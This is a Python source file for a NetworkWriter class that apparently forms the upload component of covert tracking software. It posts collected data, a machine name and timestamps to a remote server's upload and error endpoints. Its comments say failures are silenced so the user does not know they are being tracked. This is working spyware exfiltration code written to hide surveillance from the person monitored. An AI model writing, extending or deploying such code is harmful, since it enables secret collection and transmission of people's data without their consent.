import requests
from datetime import datetime
from I_writer import IWriter


class NetworkWriter(IWriter):
    """Sending data to a server."""

    def __init__(self, url: str):
        """Receive the URL address."""
        self.url = url

    def send_data(self, data, machine_name: str):
        """Send the data with the machine name (passed as a parameter) and a timestamp."""
        time_now = datetime.now().strftime('%d.%m.%Y %H:%M:%S')
        data_to_send = {'mac': machine_name, 'time': time_now, 'data': data}
        try:
            requests.post(self.url + '/api/upload', json=data_to_send, timeout=5)
        except Exception as e:
            try:  # Attempt to send the type of error to the server, in case the error is not related to the data send
                self.send_error(e, machine_name)
            except requests.exceptions.RequestException:
                pass  # If it fails, do nothing so the user doesn't know they're being tracked :)

    def send_error(self, error_data, machine_name):
        """Attempt to send the error data to the server if an error occurred on the tracked machine."""
        time_now = datetime.now().strftime('%d.%m.%Y %H:%M:%S')
        data_to_send = {'mac': machine_name, 'time': time_now, 'error_data': str(error_data)}
        try:
            requests.post(self.url + '/api/send_error', json=data_to_send, timeout=5)
        except requests.exceptions.RequestException:
            pass  # If it fails, do nothing so the user doesn't know they're being tracked :)
